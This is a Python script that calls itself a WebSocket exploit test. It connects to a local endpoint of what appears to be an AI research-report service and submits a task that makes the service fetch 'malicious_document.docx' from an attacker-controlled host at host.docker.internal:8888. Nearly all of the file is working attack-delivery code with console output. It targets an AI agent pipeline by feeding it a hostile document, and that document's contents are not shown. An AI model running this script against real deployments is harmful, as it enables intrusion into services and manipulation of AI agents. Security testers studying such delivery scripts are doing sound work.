#!/usr/bin/env python3
"""
Simple test script for WebSocket exploit
"""

import asyncio
import json
import websockets

async def send_exploit():
    payload = {
        "task": "Please analyze this document",
        "report_type": "research_report",
        "report_source": "hybrid",
        "source_urls": [],
        "document_urls": ["http://host.docker.internal:8888/malicious_document.docx"],
        "tone": "Objective",
        "headers": {},
        "query_domains": [],
        "mcp_enabled": False,
        "mcp_strategy": "fast",
        "mcp_configs": []
    }

    uri = "ws://localhost:8009/ws"
    print(f"[*] Connecting to {uri}...")

    try:
        async with websockets.connect(uri, ping_interval=None) as ws:
            print("[*] Connected!")

            # Send the payload
            message = "start" + json.dumps(payload)
            print(f"[*] Sending: {message[:100]}...")
            await ws.send(message)
            print("[*] Message sent!")

            # Wait for responses
            print("[*] Waiting for responses...")
            timeout_counter = 0
            max_timeout = 60  # 60 seconds total

            while timeout_counter < max_timeout:
                try:
                    response = await asyncio.wait_for(ws.recv(), timeout=5.0)
                    print(f"[<] {response[:200]}")

                    # Check if done
                    try:
                        data = json.loads(response)
                        if data.get('type') == 'path':
                            print("[✓] Research completed!")
                            break
                        if data.get('type') == 'error':
                            print(f"[!] Error: {data}")
                            break
                    except:
                        pass

                except asyncio.TimeoutError:
                    print(f"[*] Waiting... ({timeout_counter}s)")
                    timeout_counter += 5

    except Exception as e:
        print(f"[✗] Error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    asyncio.run(send_exploit())
